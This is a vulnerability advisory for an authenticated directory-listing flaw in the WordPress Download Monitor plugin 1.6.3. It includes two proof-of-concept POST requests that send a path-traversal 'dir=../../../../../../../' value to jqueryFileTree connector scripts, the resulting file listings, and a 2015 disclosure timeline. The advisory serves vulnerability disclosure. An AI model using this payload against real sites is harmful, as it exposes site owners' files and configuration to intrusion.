@@ -1,0 +1,44 @@
+WordPress download-monitor 1.6.3 Authenicated Directory Listing
+
+
+[-] Plugin Link:
+
+https://wordpress.org/plugins/download-monitor/
+https://www.download-monitor.com/
+
+[-] Affected Version:
+
+Version 1.6.3
+
+
+[-] Vulnerability Description:
+
+a directory listing vulnerability can lead to information disclosure(phpinfo, backups, etc...)
+the only requirement needed to run this is an authenicated user and there is a lot of sites enabling user registration
+accessing /download-monitor/assets/js/jqueryFileTree/connectors/jqueryFileTreeDir.php directly with $_POST['dir'] set to a directory path will show you all directories inside the selected path
+and there is also /download-monitor/assets/js/jqueryFileTree/connectors/jqueryFileTree.php , it will show you all directories and files inside the requested dir
+this is because scandir() is being used
+
+[-] Proof of Concept:
+
+POC 1:
+http://localhost/wordpress/wp-content/plugins/download-monitor/assets/js/jqueryFileTree/connectors/jqueryFileTreeDir.php
+post data: dir=../../../../../../../
+response:
+
+<ul class="jqueryFileTree" style="display: none;"><li class="file"><a href="[url=view-source:http://localhost/x/wordpress/wp-content/plugins/download-monitor/assets/js/jqueryFileTree/connectors/jqueryFileTreeDir.php#]#[/url]" rel="../../../../../../../"><Select this directory></a></li><li class="directory collapsed"><a href="[url=view-source:http://localhost/x/wordpress/wp-content/plugins/download-monitor/assets/js/jqueryFileTree/connectors/jqueryFileTreeDir.php#]#[/url]" rel="../../../../../../../wp-admin/">wp-admin</a></li><li class="directory collapsed"><a href="[url=view-source:http://localhost/x/wordpress/wp-content/plugins/download-monitor/assets/js/jqueryFileTree/connectors/jqueryFileTreeDir.php#]#[/url]" rel="../../../../../../../wp-content/">wp-content</a></li><li class="directory collapsed"><a href="[url=view-source:http://localhost/x/wordpress/wp-content/plugins/download-monitor/assets/js/jqueryFileTree/connectors/jqueryFileTreeDir.php#]#[/url]" rel="../../../../../../../wp-includes/">wp-includes</a></li></ul>
+
+POC 2:
+http://localhost/wordpress/wp-content/plugins/download-monitor/assets/js/jqueryFileTree/connectors/jqueryFileTree.php
+post data: dir=../../../../../../../
+response:
+
+<ul class="jqueryFileTree" style="display: none;"><li class="directory collapsed"><a href="[url=view-source:http://localhost/x/wordpress/wp-content/plugins/download-monitor/assets/js/jqueryFileTree/connectors/jqueryFileTree.php#]#[/url]" rel="../../../../../../../wp-admin/">wp-admin</a></li><li class="directory collapsed"><a href="[url=view-source:http://localhost/x/wordpress/wp-content/plugins/download-monitor/assets/js/jqueryFileTree/connectors/jqueryFileTree.php#]#[/url]" rel="../../../../../../../wp-content/">wp-content</a></li><li class="directory collapsed"><a href="[url=view-source:http://localhost/x/wordpress/wp-content/plugins/download-monitor/assets/js/jqueryFileTree/connectors/jqueryFileTree.php#]#[/url]" rel="../../../../../../../wp-includes/">wp-includes</a></li><li class="file ext_htaccess"><a href="[url=view-source:http://localhost/x/wordpress/wp-content/plugins/download-monitor/assets/js/jqueryFileTree/connectors/jqueryFileTree.php#]#[/url]" rel="../../../../../../../.htaccess">.htaccess</a></li><li class="file ext_php"><a href="[url=view-source:http://localhost/x/wordpress/wp-content/plugins/download-monitor/assets/js/jqueryFileTree/connectors/jqueryFileTree.php#]#[/url]" rel="../../../../../../../index.php">index.php</a></li><li class="file ext_txt"><a href="[url=view-source:http://localhost/x/wordpress/wp-content/plugins/download-monitor/assets/js/jqueryFileTree/connectors/jqueryFileTree.php#]#[/url]" rel="../../../../../../../robots.txt">robots.txt</a></li><li class="file ext_php">
+...
+
+[-] Timeline:
+
+18:06 8 March 2015 - Vendor Notified
+19:10 8 March 2015 - Vendor Replied & Offered a Product Award
+19:50 8 March 2015 - Fix Released
+20:09 8 March 2015 - Public Disclosure
